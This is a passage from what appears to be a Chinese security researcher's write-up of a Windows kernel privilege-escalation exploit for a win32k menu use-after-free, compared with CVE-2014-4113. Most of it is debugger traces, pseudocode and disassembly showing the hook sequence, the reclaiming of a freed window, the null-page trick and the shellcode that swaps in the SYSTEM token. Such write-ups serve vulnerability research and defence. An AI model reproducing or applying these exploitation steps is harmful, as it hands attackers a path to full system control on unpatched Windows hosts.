    win32k!xxxMNFindWindowFromPoint+0x86:
    90669624 8b07            mov     eax,dword ptr [edi]
    kd> dd edi
    fde8da68  12a10008 fea38d58 fea11430 00000000
可以看到这里eax的值是edi+0ch对应的值，也就是0，对应伪代码v5变量值为0，也就是if语句判断没通过，跳转了。这样我们还需要重新看一下这个值，这个值来自于tagPopupMenu结构体，通过CVE-2014-4113和CVE-2015-2546的tagPopupMenu结构体做一个对比。
    kd> dt tagPOPUPMENU fde8da68//我们的Exploit中的结构体
       +0x004 spwndNotify      : 0xfea38d58 tagWND
       +0x008 spwndPopupMenu   : 0xfea11430 tagWND
       +0x00c spwndNextPopup   : (null) 
    kd> dt fde8da68 tagPOPUPMENU//CVE-2014-4113的结构体
       +0x004 spwndNotify      : 0xfea39de8 tagWND
       +0x008 spwndPopupMenu   : 0xfea12398 tagWND
       +0x00c spwndNextPopup   : 0xfea12578 tagWND
实际上，在通过TrackPopupMenu之后会调用MNLoop进入循环处理消息，而我们的exp中只有一个postmessage，于是我们增加到三个postmessage，再次调试跟踪。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e7:
    90669060 57              push    edi
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> r edi
    edi=fde8da68
       +0x004 spwndNotify      : 0xfea39d18 tagWND
       +0x008 spwndPopupMenu   : 0xfea11430 tagWND
       +0x00c spwndNextPopup   : 0xfea12698 tagWND
这样，我们就能够处理了，接下来利用三个钩子，分别处理三种消息的调用，这个调用过程和CVE-2014-4113相比差别还是比较大的。需要来看一下最关键的钩子该怎么用。首先我们要分析一下和漏洞利用最关键的函数xxxMNHideNextHierarchy，这个函数有一个参数。
    signed int __stdcall xxxMNHideNextHierarchy(int a1)
      v1 = *(_DWORD *)(a1 + 12);
      if ( v1 )
      {
        v2 = *(void **)(a1 + 12);
        if ( v2 != *(void **)(a1 + 28) )
          xxxSendMessage(v2, -28, 0, 0);//这里调用shellcode提权
这个参数a1直接影响到后面的提权，回到外层看一下这个a1从哪里来。
    v6 = xxxMNFindWindowFromPoint(v3, (int)&UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理
          v7 = v6;                                  // v7可控
          ……
          v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h
          if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
                xxxMNHideNextHierarchy((int)v9);    // 漏洞触发关键位置
正是从MNFindWindowFromPoint而来，本来是一次轻松愉快的旅程，但是实际上在逻辑代码中，有一个地方导致了这次旅程血崩，就是：
    if ( IsWindowBeingDestroyed(v7) )
                return;
这个地方会对窗口的属性进行检查，也就是说，v7不能是一个任意值，比如是我们直接通过零页分配的shellcode的某个地址指针，如果可以的话，后面就会导致其他的利用了，因此这个值必须是一个窗口的值，因此我们用一种方法：
就是创建窗口A和窗口B，在这里通过异步调用，返回窗口B的值，这样后续处理中，就会将窗口B的tagMenu偏移+0B0h位置的值，也就是tagPopupMenu交给v9，那么随后在最后一个SendMessage中销毁窗口B，通过一些方法将销毁后的位置占位，因为后面没有进行判断，从而可以调用占位后的值。而通过分析xxxMNHideNextHierarchy，内层函数用的是tagPopupMenu->spwndNextPopup，因此，只要在占位时再控制这个值，为一个我们可控的值，最后就能在xxxMNHideNextHierarchy里的sendmessage完成最后一步提权了。
有了这个思路，我们开始利用钩子来完成这个过程。第一步，在FindWindowFromMessage函数调用中，处理1EB消息，这个和CVE-2014-4113很像。
    90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)
    win32k!xxxMNMouseMove+0x4d:
    9066943c f7470400800000  test    dword ptr [edi+4],8000h
    kd> r eax
    eax=fea396d0
第一步钩子会返回窗口B的值，这样，也能绕过IsDestroy的判断，随后进入第二步处理，第二步处理的值，是1E5的消息，这个消息返回后会将返回值和0x10做一个判断。
    xor     edi, edi
    push    edi             ; Address
    push    dword ptr [ebp+UnicodeString] ; UnicodeString
    push    1E5h            ; MbString
    push    esi             ; P
    call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
    ; 67:           if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
    test    al, 10h
    jz      short loc_BF939583
这样我们控制钩子令返回值为0x10就可以了。
    kd> p
    win32k!xxxMNMouseMove+0x134:
    90669523 e87500f8ff      call    win32k!xxxSendMessage (905e959d)
    kd> g
    Breakpoint 16 hit
    win32k!xxxMNMouseMove+0x139:
    90669528 a810            test    al,10h
    kd> r eax
    eax=00000010
    kd> p
    win32k!xxxMNMouseMove+0x13b:
    9066952a 7457            je      win32k!xxxMNMouseMove+0x194 (90669583)
第三步处理1F0的消息，这一步很关键，会调用SendMessage，在这一步的钩子中对窗口B进行销毁，销毁后占位，由于这一步是在一个if语句里，因此需要返回值为0，才能通过非的判断。
    .text:BF939530                 push    edi             ; Address
    .text:BF939531                 push    edi             ; UnicodeString
    .text:BF939532                 push    1F0h            ; MbString
    .text:BF939537                 push    esi             ; P
    .text:BF939538                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
    .text:BF93953D                 test    eax, eax
    .text:BF93953F                 jnz     short loc_BF939583
    .text:BF939541 ; 68:             xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置
这样的话，我们销毁窗口，并且进行占位
    kd> p
    Breakpoint 17 hit
    win32k!xxxMNMouseMove+0x14e:
    9066953d 85c0            test    eax,eax
    kd> p
    win32k!xxxMNMouseMove+0x150:
    9066953f 7542            jne     win32k!xxxMNMouseMove+0x194 (90669583)
    kd> r eax
    eax=00000000
    kd> p
    win32k!xxxMNMouseMove+0x152:
    90669541 53              push    ebx
最后占位后就是处理后的ebx了，这时候我们对ebx后的值也很有讲究，ebx+0Ch的值就是我们最后要调用到的值，这个值刚开始我想是直接按照CVE-2014-4113中的值一样定义成0xfffffffb，但是后来发现，在HideNextHierarchy函数中会将这个值自加进行一个赋值。
    kd> p
    win32k!xxxMNHideNextHierarchy+0x2c:
    90648efa ff4004          inc     dword ptr [eax+4]
    kd> dd eax
    ffffffff  ???????? fe7d2179 00000000 00000000
因此，如果eax的值是0xfffffffb的话，加4之后就是0xffffffff，仍然是个无效地址，这个无效地址自加会导致系统异常，因此，我把eax的值设为0xffffffff，这样同样需要重新分配0页内存。
    kd> p
    win32k!xxxMNHideNextHierarchy+0x9:
    90648ed7 8b7508          mov     esi,dword ptr [ebp+8]
    kd> p
    win32k!xxxMNHideNextHierarchy+0xc:
    90648eda 8b460c          mov     eax,dword ptr [esi+0Ch]
    kd> p
    win32k!xxxMNHideNextHierarchy+0xf:
    90648edd 85c0            test    eax,eax
    kd> r eax
    eax=ffffffff
这样就绕过了最后一层判断，最后到达1E4的消息调用，这个地方传递的值就已经是0xffffffff了。
    kd> p
    win32k!xxxMNHideNextHierarchy+0x37:
    90648f05 6a00            push    0
    kd> p
    win32k!xxxMNHideNextHierarchy+0x39:
    90648f07 6a00            push    0
    kd> p
    win32k!xxxMNHideNextHierarchy+0x3b:
    90648f09 68e4010000      push    1E4h
    kd> p
    win32k!xxxMNHideNextHierarchy+0x40:
    90648f0e 50              push    eax
    kd> r @eax=ffffffff
    kd> p
    win32k!xxxMNHideNextHierarchy+0x41:
    90648f0f e88906faff      call    win32k!xxxSendMessage (905e959d)
    kd> dd esp
    92dd3a3c  ffffffff 000001e4 00000000 00000000
接下来向内层继续传递，和CVE-2014-4113的利用过程就基本一致了。
    kd> p
    win32k!xxxSendMessage+0x23:
    905e95c0 e882fdffff      call    win32k!xxxSendMessageTimeout (905e9347)
    kd> dd esp
    92dd3a14  ffffffff 000001e4 00000000 00000000
最后，执行到shellcode
    kd> p
    win32k!xxxSendMessageTimeout+0x1a9:
    905e94f0 ff5660          call    dword ptr [esi+60h]
    kd> r esi
    esi=ffffffff
    kd> dd esi+60
    0000005f  00371410 00000000 00000000 00000000
    kd> p
    Breakpoint 6 hit
    00371410 55              push    ebp
下一个写入断点
    kd> !process 0 0
    **** NT ACTIVE PROCESS DUMP ****
    PROCESS 841bdab0  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
        DirBase: 00185000  ObjectTable: 87c01be8  HandleCount: 490.
        Image: System
    PROCESS 845da8a8  SessionId: 1  Cid: 0ddc    Peb: 7ffdf000  ParentCid: 0cf8
        DirBase: 3f321500  ObjectTable: 95b440f0  HandleCount:  28.
        Image: EoP_1.exe
    kd> dd 845da8a8+f8
    845da9a0  86094613 000078da 00000000 00000000原进程token
    shellcode进行替换
    kd> dd 845da8a8+f8 //提权Token
    845da9a0  87c01337 000078da 00000000 00000000
    kd> dd 841bdab0+f8 //系统Token
    841bdba8  87c01337 00000000 00000000 00000000
现在是system的token了，最后放一个提权后的截图
### 后记
这个漏洞总体来说可以算是CVE-2014-4113的进阶，和内核较劲的过程非常有意思，一步步的思考和绕过，让我想起以前膜拜大牛们过狗的案例中一步步bypass的过程，实际上二进制也是一样。
那么这篇文章也写到这里，希望大牛们多多批评指正，也希望大家也都能有所收获，谢谢！
* * *